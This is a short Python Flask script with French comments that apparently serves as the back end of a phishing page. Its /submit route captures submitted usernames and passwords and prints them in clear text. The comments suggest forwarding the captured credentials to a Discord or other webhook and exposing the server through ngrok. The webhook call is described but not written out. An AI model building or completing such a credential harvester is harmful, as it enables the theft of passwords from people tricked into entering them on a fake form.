from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    print(f"Nom d'utilisateur : {username}")
    print(f"Mot de passe : {password}")
    # Envoi des données à un webhook (par exemple, Discord ou un autre service)
    # Utilise des services comme ngrok pour exposer localement ton serveur à Internet
    return 'Données reçues !'

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000)
